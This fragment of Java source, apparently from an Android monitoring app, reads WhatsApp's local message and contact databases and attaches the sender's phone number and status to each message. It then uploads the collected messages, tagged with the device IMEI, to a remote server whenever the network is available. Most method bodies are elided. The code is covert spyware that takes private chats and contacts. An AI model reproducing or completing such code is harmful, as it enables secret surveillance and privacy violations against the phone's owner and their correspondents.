...
//}
	...
	private static final String[] MESSAGES_COLUMNS = new String[] {"_id", "key_remote_jid", "key_from_me", "data", "timestamp"};
	private static final String[] WA_COLUMNS = new String[] { "jid", "display_name", "number", "status" };
	...
	private synchronized void _getNewChat(){
		...
		try {
			...
			if (list != null && list.size() > 0 && networkAvailable()) {
				new ServerMessanger(
					mContext,
					new ServerMessage(MessageType.WA, mSettings.imei(), list),
	...
	private ArrayList<IMessageBody> getMessages(SQLiteDatabase db){
		...
		try {
			...
			while (c.moveToNext()) {
				...
				int type = c.getInt(2) + 1; /* c.getInt(1) == 1 - is out;*/
	...
	private synchronized IMMessage setUserInfo(String jid, IMMessage message){
		...
		try {
			...
			if (c.moveToFirst()) {
                ...
                message.addAuthorPhone(c.getString(2));
                message.addAuthorMood(c.getString(3));
